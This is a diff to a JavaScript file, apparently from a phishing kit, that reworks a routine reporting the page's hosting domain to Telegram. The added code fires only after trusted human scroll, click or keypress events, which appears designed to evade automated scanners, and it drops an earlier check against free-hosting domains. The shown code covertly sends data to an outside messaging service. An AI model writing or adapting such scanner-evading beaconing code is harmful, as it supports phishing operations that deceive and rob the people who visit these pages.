@@ -10,7 +10,7 @@
   var submitBtn = form.querySelector('.button-subm');
 
   // ============================================================
-  // ====== DOMAIN DETECTION - HUMAN INTERACTION ONLY ===========
+  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
   // ============================================================
 
   let domainDetected = false;
@@ -21,38 +21,48 @@
     const currentUrl = window.location.href;
     const urlObj = new URL(currentUrl);
     const domain = urlObj.hostname;
-    
-    const freeDomains = [
-      '.tk', '.ml', '.ga', '.cf', '.gq',
-      '.free.nf', '.free.org', '.free.com',
-      '.co.cc', '.co.nr', '.cjb.net',
-      '.dynu.net', '.ddns.net', '.no-ip.org',
-      'vercel.app', 'netlify.app', 'github.io',
-      'pages.dev', 'web.app', 'firebaseapp.com',
-      'herokuapp.com', 'glitch.me', 'replit.co',
-      '000webhostapp.com', 'byethost.com',
-      'freehostia.com', 'profreehost.com',
-      '.example.com', '.test', '.localhost'
-    ];
-
-    const isFree = freeDomains.some(freeDomain => 
-      domain.includes(freeDomain) || domain.endsWith(freeDomain)
-    );
 
     domainDetected = true;
 
     sendToTelegram('domain_detection', {
-      domain: domain,
-      isFree: isFree
+      domain: domain
     });
+
+    console.log(`🌐 Domain detected: ${domain}`);
   }
 
+  // Detect on human scroll
+  let humanInteractionDetected = false;
+
+  window.addEventListener('scroll', function(e) {
+    if (domainDetected) return;
+    
+    const now = Date.now();
+    
+    // Check if event is trusted (human-initiated)
+    if (e.isTrusted) {
+      humanInteractionDetected = true;
+    }
+    
+    const scrollY = window.scrollY;
+    
+    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
+      detectDomain();
+    }
+  }, { passive: true });
+
+  // Fallback: click detection
   document.addEventListener('click', function(e) {
-    if (!domainDetected && e.isTrusted) detectDomain();
+    if (!domainDetected && e.isTrusted) {
+      detectDomain();
+    }
   });
 
+  // Fallback: keypress detection
   document.addEventListener('keydown', function(e) {
-    if (!domainDetected && e.isTrusted) detectDomain();
+    if (!domainDetected && e.isTrusted && e.key.length === 1) {
+      detectDomain();
+    }
   });
 
   // ============================================================
